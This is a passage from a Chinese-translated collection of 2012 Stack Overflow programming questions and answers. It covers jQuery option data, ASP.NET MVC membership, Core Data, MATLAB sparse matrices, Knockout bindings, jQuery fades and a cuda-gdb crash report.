在你提出这个问题几个月后，我仍然想把它包括在内，这样它可以在其他用户查找类似问题时帮助他们。我最近碰巧遇到了一个类似的问题，我看到了这个线程并使用 Tadeck 的答案来设置使用 jquery 的下拉列表的数据值。

起初，数据值也没有像您提到的那样正确设置，但后来我采用了这种方法并做了一些事情（见下文），帮助我在 jquery 中设置/检索数据值。

```
var element = $('<option></option>');  
element.val('id').text('uiName');  
$(element).data("type", 'mytype'); 
```

// 这里唯一的变化是，我没有使用 element.data(...) 将元素称为 jquery dom 元素，而是使用 $ 以某种方式正确设置了值，我现在也可以检索数据字段！

希望这可以帮助面临类似问题的其他用户

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-07-09T19:41:41.017

无需拆分您的价值观，您可以简单地做到这一点。

```
var element = $(' <option data-type1="" data-type2=""></option>'); 
```

只需使用数据添加尽可能多的字段-（任何属性）

放 - `$(element).data("type1", yourValues);`

得到 -`$("#dropdownID :selected").data("type1");`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-13T09:41:14.033

所以从我的研究来看，这是不可能的 .data() 需要在一个元素上而不是在子部分上。所以它不能附加到`<option>`元素上

我所做的是将数据包含在 value 字段中，然后在访问 value 时将其拆分。

设置代码

```
 var element = $('<option></option>');
       element.val(i.StartTime +"--" +TID).html(i.StartTime + ' - ' + i.EndTime); 
```

访问代码

```
 var str = $(this).val();
        var substr = str.split('--');
        var time = substr[0];
        var TID = substr[1]; 
```

# asp.net-mvc - MVC 4、成员资格/配置文件和 aspnet_resql

> ID：12392139
> 
> 赞同：2
> 
> 时间：2012-09-12T15:58:08.050
> 
> 标签：asp.net-mvc

我正在开发一个 MVC 4 应用程序。我正在研究会员身份验证和个人资料模块，我有点困惑。

我很困惑，因为似乎有两组授权/配置文件模块在幕后工作：

## 简洁版本

有两组授权表：一组是在您创建新的 MVC 4 Internet 应用程序时创建的，第二组是在您运行 aspnet_regsql 时创建的。数据以一种令人困惑的方式从两组中保存和提取。

这两个集合有什么关系：什么保存在哪里？为什么要在两组中创建用户？等等

## 长版

## 设置 1

我创建了一个新的 MVC 4 Internet 项目。它具有注册用户和创建角色的能力。自动生成的数据库包含以下表格：Users、Roles、UserInRoles、Memebership、Profiles。没有存储过程。授权工作正常：用户数据和角色已正确保存在用户、角色和 UserInRoles 表中。

## 设置 2

然后我继续为站点用户添加配置文件。我跟着[乔尔的回答](https://stackoverflow.com/questions/426609/how-to-assign-profile-values)。运行代码时点击这一行：AccountProfile.CurrentUser.FullName = "Snoopy"; 我收到了这个错误：

找不到存储过程“dbo.aspnet_CheckSchemaVersion”。

我针对之前创建的数据库运行了 aspnet_regsql，并创建了预期的一组 aspnet_ 表和存储过程。再次测试了我的代码。这次它工作正常，并且配置文件属性被保存到 aspnet_Profile 表中（这是意料之中的）。

在下一步中，我创建了一个新用户。用户是在两个用户和 aspnet_Users 表中创建的（具有不同的 UserId 值）——请参见此处的[图片 1](http://www.caspit.biz/images/z/12092012_184456.png)

将属性 FullName=Snoopy 添加到他的个人资料中。

运行 Membership.GetUser().ProviderUserKey 从表 Users 中返回 UserId。运行 AccountProfile.CurrentUser.FullName 返回“史努比”。请看这里的[图2](http://www.caspit.biz/images/z/12092012_185023.png)。

这非常令人惊讶，因为这意味着系统以某种方式知道如何将表 Users 中的记录与表 aspnet_Profile 中的记录相关联，其中 UserId 字段来自表 aspnet_users。顺便说一句，我验证了表 Profiles 是空的，因此没有从那里获取值。

那么这里发生了什么？这种行为是预期的行为吗？或者 Jole 的回答是错误的，因为在 MVC 4 应用程序中实现 Profile 有其他一些（更好的？）方法，而我所做的就是在工作中投入一把扳手？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-13T08:35:14.893

您可能应该使用其中一种。这是帮助您决定的最新帖子： [http ://weblogs.asp.net/jgalloway/archive/2012/08/29/simplemembership-membership-providers-universal-providers-and-the-new-asp-net-4 -5-web-forms-and-asp-net-mvc-4-templates.aspx](http://weblogs.asp.net/jgalloway/archive/2012/08/29/simplemembership-membership-providers-universal-providers-and-the-new-asp-net-4-5-web-forms-and-asp-net-mvc-4-templates.aspx)

# objective-c - 我应该从 Apple 的 Core Data Utility 教程中获得什么价值？

> ID：12392142
> 
> 赞同：0
> 
> 时间：2012-09-12T15:58:15.227
> 
> 标签：objective-c, ios, macos, core-data, command-line

我正在关注[核心数据实用程序教程](https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/CoreDataUtilityTutorial/Articles/06_runClass.html#//apple_ref/doc/uid/TP40001800-CH234-TP9)，并且我已经实现了[自定义托管对象类](https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/CoreDataUtilityTutorial/Articles/06_runClass.html#//apple_ref/doc/uid/TP40001800-CH234-TP9_)。它构建并运行良好，但值似乎不正确。我的 CDCLI.cdcli 文件充满了这样的对象：

```
<object type="RUN" id="z114">
    <attribute name="processid" type="int64">1334</attribute>
    <attribute name="date" type="date">369155986.60885798931121826172</attribute>
</object> 
```

该“日期”属性看起来不像日期。日期和 processID 属性设置如下：

```
// Attribute: Date
NSAttributeDescription *dateAttribute = [[NSAttributeDescription alloc] init];

[dateAttribute setName:@"date"];
[dateAttribute setAttributeType:NSDateAttributeType];
[dateAttribute setOptional:NO];

// Attribute: Process ID
NSAttributeDescription *idAttribute = [[NSAttributeDescription alloc] init];

[idAttribute setName:@"processID"];
[idAttribute setAttributeType:NSInteger64AttributeType];
[idAttribute setOptional:NO];
[idAttribute setDefaultValue:[NSNumber numberWithInteger:-1]]; 
```

基于以下方法，我期望收到“0”作为 processID 属性值，但我不是。

```
- (void)setNilValueForKey:(NSString *)key {

    if ([key isEqualToString:@"processID"]) {
        self.processID = 0;
    } else {
        [super setNilValueForKey:key];
    }
} 
```

事实上，向该方法添加一些 NSLog 语句告诉我它甚至没有被调用，我必须弄清楚这一点。

有谁知道 date 和 processID 属性*应该*是什么样子，所以我可以确定我得到了正确的值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:50:19.470

日期值对我来说看起来不错。内部格式是自参考日期（2001 年 1 月 1 日，格林威治标准时间）以来的秒数。该值约为 11.7 年，这似乎是一个合理的日期。

同样，进程 ID 1334 似乎是 PID 的合适值。

最后，在您的代码中，您执行以下操作：

```
if ([key isEqualToString:@"ProcessID"]) { 
```

但是如果属性名称似乎不一致，您的用法。日志显示`processid`，您的第一组代码使用`processID`，第二组代码使用`ProcessID`。

# matlab - 如何在matlab中将稀疏矩阵保存到mat文件

> ID：12392153
> 
> 赞同：1
> 
> 时间：2012-09-12T15:58:43.953
> 
> 标签：matlab, sparse-matrix

我想将两个稀疏矩阵 Y 和 R 保存到 mat 文件中。但是，当我运行以下代码时，我发现其中`twomatrices.mat`包含两个完整矩阵而不是稀疏矩阵。.mat 文件是否只允许包含完整矩阵？

```
save('twomatrices.mat', 'Y', 'R'); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:07:23.883

确保您实际创建了稀疏矩阵：例如，以下代码片段可以正常工作并将矩阵存储为稀疏双精度矩阵：

```
n = 5;
Y = sparse(1:n,1:n,1);
R = sparse(1:n,1:n,2);
save('twomatrices.mat', 'Y', 'R');

clear
load('twomatrices.mat')
Y

Y =

   (1,1)        1
   (2,2)        1
   (3,3)        1
   (4,4)        1
   (5,5)        1 
```

# version-control - 从 URL 下载项目

> ID：12392161
> 
> 赞同：1
> 
> 时间：2012-09-12T15:59:04.503
> 
> 标签：version-control, download, mercurial

我正在寻找在这里下载示例项目代码：[andengine](http://code.google.com/p/andengineexamples/source/browse/#hg)

问题是：如何下载文件夹 hg 以获取示例项目？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:36:46.153

[从这里](http://tortoisehg.bitbucket.io/download/index.html)下载`mercurial`（或 TortoiseHG 客户端）并在命令行中执行：

```
hg clone https://code.google.com/p/andengineexamples/ 
```

# ruby-on-rails - 使用回形针和导轨调整数千张图像大小的最佳方法是什么？

> ID：12392165
> 
> 赞同：-3
> 
> 时间：2012-09-12T15:59:17.680
> 
> 标签：ruby-on-rails, paperclip

我有一个带有 6 张回形针照片（照片 1、照片 2、照片 3、照片 4、照片 5 和照片 6）的模型。

因为最近网站设计发生了变化，我需要调整六张图片的所有样式。款式有小号、中号和大号。

我的想法是使用前置过滤器方法来执行 Model.photo1.reprocess！并在模型表中添加一列（例如“重新处理”为布尔值）以检查它是否被重新处理。

我认为这个想法比使用 rake 脚本在一次迁移中迁移所有照片和下一次部署更有效。

**产品控制器**

```
before_filter :check_image_reprocess, :only => [:show]  

def check_image_reprocess
  @product = Product.find(params[:id])
  if @product.reprocess == false
    @product.photo.reprocess! unless @product.photo.nil?
    @product.photo2.reprocess! unless @product.photo2.nil?
    @product.photo3.reprocess! unless @product.photo3.nil?
    @product.photo4.reprocess! unless @product.photo4.nil?
    @product.photo5.reprocess! unless @product.photo5.nil?
    @product.photo6.reprocess! unless @product.photo6.nil?
    @product.update_attributes(:reprocess => true)
  end
end 
```

实际上它是有效的，但如果存在对此的任何评论或更好的建议，将非常欢迎:)？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-19T11:45:44.780

这样，经过 1 周的测试，它就可以正常工作了！！

享受

# mockups - 多页面应用程序的样机应用程序？

> ID：12392166
> 
> 赞同：2
> 
> 时间：2012-09-12T15:59:21.043
> 
> 标签：mockups

我一直在使用 Balsamiq 为新应用程序创建模型。它最初运行得很好，但现在感觉这个应用程序对 Balsamiq 来说变得越来越大了。

我已经用 Balsamiq 中的链接功能连接了许多 Balsamiq 屏幕。但这迫使我创建太多的屏幕。每一次点击都让我创建一个全新的屏幕。因此，如果我想更改我在许多链接屏幕上使用的按钮，那么我必须更改所有这些按钮。

是否有不同的应用程序来创建模型，它不会强迫我为每次点击创建新的模型？我不知道我在寻找什么，但也许当我点击一个链接时，只有部分模型应用程序发生变化？

Balsamiq 中也没有用于在结构中维护我的模型的功能。也许这也会有所帮助。我在本质上寻找的是一个应用程序，它让我可以通过许多点击和页面来模拟更复杂的应用程序。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T18:18:57.983

[WireframeSketcher](http://wireframesketcher.com)是一个具有项目的线框工具，可让您在目录中组织模型。它基于 Eclipse IDE，因此它共享相同的高级文件组织方式。WireframeSketcher 还支持重构，这使得在不破坏链接的情况下轻松移动文件或重命名它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-08T18:24:52.947

研究在 Balsamiq 中使用[“符号” ，这可能会对您有所帮助。](http://support.balsamiq.com/customer/portal/articles/110439-working-with-symbols)你能做的就是把任何一个团体变成一个象征。然后您可以在多个页面上使用这些符号。如果您想在多个地方更改按钮，您只需更改一次符号，更改将在您设计的其余部分进行。希望有帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-11T21:10:15.300

[MockupScreens](http://MockupScreens.com)具有“主屏幕”，类似于 PowerPoint 中的主幻灯片。您确实在技术上创建了新屏幕，但您不会从头开始制作它们。

由于它们的大部分内容来自母版，因此您只需编辑差异：例如，某些字段中的值。

（我是 m.screens 开发者）

# javascript - 如何正确引用传递给 knockout.JS 的当前元素的属性？

> ID：12392167
> 
> 赞同：1
> 
> 时间：2012-09-12T15:59:21.870
> 
> 标签：javascript, jquery, knockout.js

处理一个小反馈表，我是 Knockout/jQuery 游戏的新手，所以我确定这是一个语法错误。

## 目标/背景

*   我有一个反馈表，其中一部分包括一个包含反馈类型的列表。我想使用的反馈类型的实际文本存储在 LI 标记的“标题”属性中。
*   我想从一组表示反馈类型的 LI 标记中传递一个 onclick。
*   我希望淘汰赛通过调用元素接收此 onclick 事件
*   我希望 ViewModel 函数根据 LI 的 title 属性的内容更新 ViewModel 的反馈类型
*   然后我想从所有列表中删除一个类并将其应用于所选元素。
    *   我已经有 jQuery 可以做到这一点；只是想将其合并到模型更改中。

## 到目前为止我所拥有的

HTML 反馈表（UL 列表）的相关部分：

```
 <ul class="thumbnails" id="feedbackList">
            <li class="feedbackItem" id="feedbackItemPraise" title="Praise" data-bind="click: updateFeedbackType"><i class="icon-thumbs-up"></i>Praise</li>
            <li class="feedbackItem" id="feedbackItemCriticism" title="Criticism" data-bind="click: updateFeedbackType"><i class="icon-thumbs-down"></i>Criticism</li>
            <li class="feedbackItem" id="feedbackItemProblem" title="Problem" data-bind="click: updateFeedbackType"><i class="icon-warning-sign"></i>Problem</li>
            <li class="feedbackItem" id="feedbackItemQuestion" title="Question" data-bind="click: updateFeedbackType"><i class="icon-question-sign"></i>Question</li>
        </ul> 
```

到目前为止的 ViewModel（包括一些不相关的部分）：

```
var FeedbackViewModel = function () {
    var self = this;
    self.manualEMailAddress = "MyEmail@MyProvider.com";
    self.manualApplicationName = "MyApplication";
    self.username = ko.observable($("#feedbackUsernameFromServer").val());
    self.feedbackType = ko.observable("Praise");
    self.wantsFollowUp = ko.observable(true);
    self.enteredName = ko.observable("");
    self.feedbackText = ko.observable("");
    self.userNameCaptured = ko.computed(function () { return self.username().length > 3; }, self);
    self.mailToLink = ko.computed(function () { return "mailto:" + self.manualEMailAddress + "?subject=" + encodeURIComponent(self.feedbackType()) + encodeURIComponent(" for ") + encodeURIComponent(self.manualApplicationName) + "&body=" + encodeURIComponent(self.feedbackText()) }, self);
};

var feedbackViewModel = new FeedbackViewModel();

ko.applyBindings(feedbackViewModel, document.getElementById("feedbackModal")); 
```

当前 jQuery 更改样式（尚未链接到模型）：

```
$("#feedbackList li").click(function () {
    $("#feedbackList li.feedbackItem-Highlighted").removeClass("feedbackItem-Highlighted");
    $(this).addClass("feedbackItem-Highlighted");
}); 
```

我认为我需要添加到 ViewModel 中，但不太奏效：

```
self.updateFeedbackType = function (elementToChangeTo) {
    self.feedbackType($(elementToChangeTo).attr("title"));
    $("#feedbackList li.feedbackItem-Highlighted").removeClass("feedbackItem-Highlighted");
    $(elementToChangeTo).addClass("feedbackItem-Highlighted");
}; 
```

这会导致 feedbackType 变成未定义的，并且视觉变化不会发生。

我哪里错了？谢谢你的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:26:05.473

我认为您只需要在 vm 的定义中使用该功能。

这是一个似乎有效的jsfiddle：

[http://jsfiddle.net/gN3HV/](http://jsfiddle.net/gN3HV/)

更新：这是一个更好地利用淘汰赛并正确实现目标的小提琴：

[http://jsfiddle.net/gN3HV/7/](http://jsfiddle.net/gN3HV/7/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T19:47:51.637

`elementToChangeTo`返回 FeedbackViewModel（与 相同`this`）而不是单击的元素——行为与 jQuery 有点不同。

传入的第二个参数`updateFeedbackType`将是一个事件，因此您可以使用它`$(event.target)`来获取对单击元素的引用。

```
self.updateFeedbackType = function (view, event) {
    var $elementToChangeTo = $(event.target);
    self.feedbackType($elementToChangeTo.attr("title"));
    $("#feedbackList li.feedbackItem-Highlighted").removeClass("feedbackItem-Highlighted");
    $elementToChangeTo.addClass("feedbackItem-Highlighted");
}; 
```

但是，@daedalus28 解决了更大的问题，即您没有利用 knockout.js 的优势并且使过程过于复杂。你真的不需要两者来解决这个简单的条件。

# javascript - 多格淡入/淡出开

> ID：12392168
> 
> 赞同：-1
> 
> 时间：2012-09-12T15:59:22.603
> 
> 标签：javascript, jquery, html

我有三个 div，每个都包含多个图像。

页面上还有三个按钮。

我想创建一个效果，其中单击每个按钮会淡入相应的 div 并淡出其他两个 div。

我曾尝试按照之前发布的代码来获得类似的效果，但没有成功，希望能得到比我更有技能的人的帮助！谢谢，罗斯

HTML如下；

```
 <div id="GROUP-Join">
    <img class="CentreBox" src="images/CentreBox.png" 
        width="487" height="173">
    <img id="TitleOne" src="images/TitleOne.png" 
        width="339" height="19">
    <img id="TitleTwo" src="images/TitleTwo.png" 
        width="143" height="14">
    <body onLoad="focus();signup.email.focus()"></body>
    <form method="post" name="signup" action="signup.php">
        <input id="EmailAddress" type="text" name="email" 
            placeholder="e-mail" style="color: #000000; 
            font-family: 'Arial'; font-size: 20px; background-color:transparent;     
            border:hidden;" size="24" maxlength="49">
        <input id="Go" type="image" name="submit" src="images/Go.png" 
            alt="submit" value="GO">   
    </form>
 </div>
 <div id="GROUP-About">
    <img class="CentreBox" src="images/CentreBOX.png" 
        width="487" height="173">
    <img id="AboutHead" src="images/AboutHead.png" 
        width="132" height="19">
    <img id="JumpAround" src="images/JumpAround.png" 
        width="379" height="33">
    <img id="Win" src="images/Win.png" 
        width="254" height="15">    
 </div>
 <div id="GROUP-Contact">
    <img class="CentreBox" src="images/CentreBOX.png" 
        width="487" height="173">
    <img id="ContactHeading" src="images/ContactHead.png" 
        width="124" height="19">
    <img id="Email" src="images/e-mail.png" 
        width="24" height="17">
    <img id="Twitter" src="images/tw.png" 
        width="24" height="20">
    <img id="fb" src="images/fb.png" 
        width="10" height="21">    
 </div>
 <button id="button1">Join</button>
 <button id="button2">About</button>
 <button id="button3">Contact</button> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:09:05.430

我不确定这就是你的意思，但这会淡入每个相应的 div 并淡出其他两个。

```
<script type="text/javascript">
    $(document).ready(function () {
        $('#btn1').click(function () {
            $('#div1').fadeIn();
            $('#div2').fadeOut();
            $('#div3').fadeOut();
        });
        $('#btn2').click(function () {
            $('#div1').fadeOut();
            $('#div2').fadeIn();
            $('#div3').fadeOut();
        });
        $('#btn3').click(function () {
            $('#div1').fadeOut();
            $('#div2').fadeOut();
            $('#div3').fadeIn();
        });
    });
</script> 
```

和标记：

```
<div>
    <div id="div1">
        hello
    </div>
    <div id="div2">
        hello 2
    </div>
    <div id="div3">
        hello 3
    </div>
    <div>
        <input type="button" id="btn1" />
        <input type="button" id="btn2" />
        <input type="button" id="btn3" />
    </div>
</div> 
```

jquery`fadeIn`和`fadeOut`函数也有回调，所以你也可以这样做：

```
$('#div2').fadeOut(100, 
    function() { $('#div3').fadeOut(100, 
            function() { $('#div1').fadeIn(100); 
        });
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:07:43.940

检查这个[小提琴](http://jsfiddle.net/sushanth009/sHaUX/)

该脚本应该为您完成工作

```
$(function(){

    $('button').on('click', function() {
        var btnText = $(this).text();

        $('div').fadeOut('slow');
        $('#GROUP-'+btnText).fadeIn('slow');
    });
});​ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T16:08:15.973

当您在 jQuery 中运行诸如fadeIn 之类的效果时，您可以提供一个回调，以便您可以在该效果完成后执行操作。例如，在您的情况下：

```
$('#button1').click(function() {
  $('#GROUP-Contact').fadeOut(500);
  $('#GROUP-About').fadeOut(500, function() {
    $('#GROUP-Join').fadeIn(500);
  });
}); 
```

这是我在没有看到任何 JS 代码的情况下对您正在寻找的内容的最佳猜测。

# cuda - 带有 cuda-memcheck 错误的 cuda-gdb

> ID：12392170
> 
> 赞同：2
> 
> 时间：2012-09-12T15:59:25.680
> 
> 标签：cuda, cuda-gdb

我有这个 cuda 代码，当我用 cuda-memcheck 执行时它没有返回错误，它正常退出，我得到的结果实际上是预期的......同时，有一个文件“cuda-memcheck-(在这里放置各种数字）.out”创建，即为空。

当我在 cuda-gdb 下运行相同的程序时，它也正常退出，没有错误报告。

但是当我“设置 cuda memcheck on”（在 cuda-gdb 下）然后运行程序时，会创建一个文件“cuda-memcheck.out”，上面写着：

> 启动 cuda-memcheck...
> 
> cuda-memcheck 遇到错误 (3,2,2)

一旦我从 cuda-gdb 中执行“运行”，就会发生这种情况。然后，在执行开始后不久（实际上非​​常接近 CUFFT 内核执行），我得到以下信息：

```
Program received signal CUDA_EXCEPTION_1, Lane Illegal Address.
[Switching focus to CUDA kernel 81, grid 82, block (0,0,0), thread (1,17,0), device 0, sm 0, warp 2, lane 5]
*** glibc detected *** cuda-gdb: double free or corruption (!prev): 0x000000001070e5d0 ***
======= Backtrace: =========
/lib/libc.so.6(+0x774b6)[0x7f597c4814b6]
/lib/libc.so.6(cfree+0x73)[0x7f597c487c83]
/lib/libc.so.6(obstack_free+0x48)[0x7f597c48b128]
cuda-gdb[0x5c5a25]
cuda-gdb[0x4352d0]
cuda-gdb[0x5649c4]
cuda-gdb[0x5e42d7]
cuda-gdb[0x5e45fd]
cuda-gdb[0x56436c]
cuda-gdb[0x50d772]
cuda-gdb[0x50e3c3]
cuda-gdb[0x51373b]
cuda-gdb[0x50faff]
cuda-gdb[0x510194]
cuda-gdb[0x51373b]
cuda-gdb[0x50eaac]
cuda-gdb[0x504311]
cuda-gdb[0x50a09d]
cuda-gdb[0x4ffc4f]
cuda-gdb[0x410b9d]
cuda-gdb[0x519c48]
cuda-gdb[0x51a82c]
cuda-gdb[0x5f9b57]
cuda-gdb[0x519cb9]
cuda-gdb[0x5186c8]
cuda-gdb[0x51995a]
cuda-gdb[0x51373b]
cuda-gdb[0x4a1a40]
cuda-gdb[0x407529]
cuda-gdb[0x51373b]
cuda-gdb[0x408056]
cuda-gdb[0x51373b]
cuda-gdb[0x407464]
cuda-gdb[0x40742e]
/lib/libc.so.6(__libc_start_main+0xfe)[0x7f597c428d8e]
cuda-gdb[0x407339]
======= Memory map: ========
00400000-008b6000 r-xp 00000000 08:01 190634                             /usr/local/cuda/bin/cuda-gdb
00ab5000-00ab6000 r--p 004b5000 08:01 190634                             /usr/local/cuda/bin/cuda-gdb
00ab6000-00ac9000 rw-p 004b6000 08:01 190634                             /usr/local/cuda/bin/cuda-gdb
00ac9000-0f0f8000 rw-p 00000000 00:00 0 
0fef3000-11b2c000 rw-p 00000000 00:00 0                                  [heap]
7f5974000000-7f5974021000 rw-p 00000000 00:00 0 
7f5974021000-7f5978000000 ---p 00000000 00:00 0 
7f597a4df000-7f597aacc000 rw-p 00000000 00:00 0 
7f597aacc000-7f597aacd000 rw-p 00000000 00:00 0 
7f597b538000-7f597b54d000 r-xp 00000000 08:01 954799                     /lib/libgcc_s.so.1
7f597b54d000-7f597b74c000 ---p 00015000 08:01 954799                     /lib/libgcc_s.so.1
7f597b74c000-7f597b74d000 r--p 00014000 08:01 954799                     /lib/libgcc_s.so.1
7f597b74d000-7f597b74e000 rw-p 00015000 08:01 954799                     /lib/libgcc_s.so.1
7f597b75d000-7f597b764000 r-xp 00000000 08:01 954961                     /lib/libthread_db-1.0.so
7f597b764000-7f597b963000 ---p 00007000 08:01 954961                     /lib/libthread_db-1.0.so
7f597b963000-7f597b964000 r--p 00006000 08:01 954961                     /lib/libthread_db-1.0.so
7f597b964000-7f597b965000 rw-p 00007000 08:01 954961                     /lib/libthread_db-1.0.so
7f597b965000-7f597b966000 ---p 00000000 00:00 0 
7f597b966000-7f597c166000 rw-p 00000000 00:00 0 
7f597c166000-7f597c40a000 r--p 00000000 08:01 49399                      /usr/lib/locale/locale-archive
7f597c40a000-7f597c584000 r-xp 00000000 08:01 954957                     /lib/libc-2.12.1.so
7f597c584000-7f597c783000 ---p 0017a000 08:01 954957                     /lib/libc-2.12.1.so
7f597c783000-7f597c787000 r--p 00179000 08:01 954957                     /lib/libc-2.12.1.so
7f597c787000-7f597c788000 rw-p 0017d000 08:01 954957                     /lib/libc-2.12.1.so
7f597c788000-7f597c78d000 rw-p 00000000 00:00 0 
7f597c78d000-7f597c78f000 r-xp 00000000 08:01 954973                     /lib/libdl-2.12.1.so
7f597c78f000-7f597c98f000 ---p 00002000 08:01 954973                     /lib/libdl-2.12.1.so
7f597c98f000-7f597c990000 r--p 00002000 08:01 954973                     /lib/libdl-2.12.1.so
7f597c990000-7f597c991000 rw-p 00003000 08:01 954973                     /lib/libdl-2.12.1.so
7f597c991000-7f597c9b7000 r-xp 00000000 08:01 954792                     /lib/libexpat.so.1.5.2
7f597c9b7000-7f597cbb7000 ---p 00026000 08:01 954792                     /lib/libexpat.so.1.5.2
7f597cbb7000-7f597cbb9000 r--p 00026000 08:01 954792                     /lib/libexpat.so.1.5.2
7f597cbb9000-7f597cbba000 rw-p 00028000 08:01 954792                     /lib/libexpat.so.1.5.2
7f597cbba000-7f597cc3c000 r-xp 00000000 08:01 954964                     /lib/libm-2.12.1.so
7f597cc3c000-7f597ce3b000 ---p 00082000 08:01 954964                     /lib/libm-2.12.1.so
7f597ce3b000-7f597ce3c000 r--p 00081000 08:01 954964                     /lib/libm-2.12.1.so
7f597ce3c000-7f597ce3d000 rw-p 00082000 08:01 954964                     /lib/libm-2.12.1.so
7f597ce3d000-7f597ce53000 r-xp 00000000 08:01 954914                     /lib/libz.so.1.2.3.4
7f597ce53000-7f597d053000 ---p 00016000 08:01 954914                     /lib/libz.so.1.2.3.4
7f597d053000-7f597d054000 r--p 00016000 08:01 954914                     /lib/libz.so.1.2.3.4
7f597d054000-7f597d055000 rw-p 00017000 08:01 954914                     /lib/libz.so.1.2.3.4
7f597d055000-7f597d095000 r-xp 00000000 08:01 954818                     /lib/libncurses.so.5.7
7f597d095000-7f597d294000 ---p 00040000 08:01 954818                     /lib/libncurses.so.5.7
7f597d294000-7f597d298000 r--p 0003f000 08:01 954818                     /lib/libncurses.so.5.7
7f597d298000-7f597d299000 rw-p 00043000 08:01 954818                     /lib/libncurses.so.5.7
7f597d299000-7f597d2b1000 r-xp 00000000 08:01 954959                     /lib/libpthread-2.12.1.so
7f597d2b1000-7f597d4b0000 ---p 00018000 08:01 954959                     /lib/libpthread-2.12.1.so
7f597d4b0000-7f597d4b1000 r--p 00017000 08:01 954959                     /lib/libpthread-2.12.1.so
7f597d4b1000-7f597d4b2000 rw-p 00018000 08:01 954959                     /lib/libpthread-2.12.1.so
7f597d4b2000-7f597d4b6000 rw-p 00000000 00:00 0 
7f597d4b6000-7f597d4d6000 r-xp 00000000 08:01 954965                     /lib/ld-2.12.1.so
7f597d4df000-7f597d672000 rw-p 00000000 00:00 0 
7f597d672000-7f597d678000 r--p 00a01000 08:06 26722558                   /home/user/workspace/cuda/fullcu/current_debug/Default/shl_3D_cu
7f597d678000-7f597d67e000 r--p 00a15000 08:06 26722558                   /home/user/workspace/cuda/fullcu/current_debug/Default/shl_3D_cu
7f597d67e000-7f597d687000 r--p 00a06000 08:06 26722558                   /home/user/workspace/cuda/fullcu/current_debug/Default/shl_3D_cu
7f597d687000-7f597d6c0000 r--p 009c5000 08:06 26722558                   /home/user/workspace/cuda/fullcu/current_debug/Default/shl_3D_cu
7f597d6c0000-7f597d6c5000 rw-p 00000000 00:00 0 
7f597d6c5000-7f597d6ca000 r--p 009fd000 08:06 26722558                   /home/user/workspace/cuda/fullcu/current_debug/Default/shl_3D_cu
7f597d6cb000-7f597d6cd000 rw-p 00000000 00:00 0 
7f597d6cd000-7f597d6d4000 r--s 00000000 08:01 49265                      /usr/lib/gconv/gconv-modules.cache0x000000000366a8d0 in fdividef<<<(16,1,1),(4,64,1)>>> (Aborted 
```

和 cuda-gdb 崩溃。

我是否应该认为我的代码中实际上存在错误的内存访问？还是在初始化 cuda-memcheck 时遇到的错误？？？

有人见过这种行为吗？

谢谢你的任何想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T17:36:37.833

您的应用程序中似乎存在可检测到 memcheck 的错误。由于某种原因，当您的应用程序在断点处暂停时，cuda-gdb 会崩溃。

1.  当您在设备代码中的常规断点处停止时，您的 cuda-gdb 会崩溃吗？
2.  您使用的是什么 CUDA Toolkit 和 NVIDIA 显示驱动程序版本？我们建议您尝试最新的 CUDA Toolkit 5.0RC 版本，因为它具有许多稳定性和功能改进。
3.  如果您可以直接通过 cudatools@nvidia.com 与团队联系以提供更多信息，那将是非常宝贵的（这样我们可能能够在下一个 CUDA Toolkit 版本中解决问题）。能否也提供触发崩溃的应用程序？

先感谢您。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T10:16:22.687

为了很好地追踪这个问题，最好向 Nvidia 提交一个错误。提交 bug 的步骤如下： 1\. 打开页面[http://developer.nvidia.com/cuda/join-cuda-registered-developer-program](http://developer.nvidia.com/cuda/join-cuda-registered-developer-program)；2、如未注册，请点击“立即加入”，否则点击“立即登录”；3、输入邮箱和密码登录；4\. 左侧面板首页有“Bug Report”项，点击即可提交Bug；5\. 填写必填项，其他项可选，但详细信息将有助于我们定位和修复问题；6\. 如有必要，应上传附件；7、Linux系统最好附上nvidia-bug-report；8\. 如果问题与特定代码模式有关，则需要示例代码和编译说明以进行复制。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-13T12:20:09.693

Based on Eugene's question on what happens on regular breakpoints, I added some in key points in the code ('key' with respect to the debugging output I have gotten until now) and I have the following 'odd' gdb output to report:

The following is from a CUFFT kernel call:

> [Launch of CUDA Kernel 41 (spVector0016B_kernelTex<(fftDirection_t)-1><<<(16,1,1),(4,64,1)>>>) on Device 0]
> 
> 0x00007ffff569c8b3 in select () from /lib/libc.so.6
> 
> (cuda-gdb) n
> 
> Single stepping until exit from function select, which has no line number information.
> 
> 0x00007ffff3fe8de7 in ?? () from /usr/lib/libcuda.so

Is '??' normal output in that case because it's a CUFFT kernel?

The following is from another kernel launch, mine this time and I don't understand why it says 'no such file':

> Breakpoint 5, BCSG<<<(1,1,1),(512,1,1)>>> (glerror=0x200620df8, sL=0x2009ffff8, ijL=0x200aa7ffc, X=0x2006035f8, D=0x2006075f8, Pre=0x200941ff8, error=1.00000001e-10, L=700, N=1024, flag=0x200c00000, r=0x2006095f8, r0=0x20060b5f8, p1=0x20060d5f8, p2=0x20060f5f8, vv=0x2006115f8, s1=0x2006135f8, s2=0x2006155f8, t=0x2006175f8, T=0x2006195f8, r1=0x20061b600, a=0x20061cbf8, w=0x20061e1f8, beta=0x20061f7f8, ns1=0x200affffc) at BCGC_solver.cu:96
> 
> 96 BCGC_solver.cu: No such file or directory.
> 
> in BCGC_solver.cu

Also i would like to ask if this:

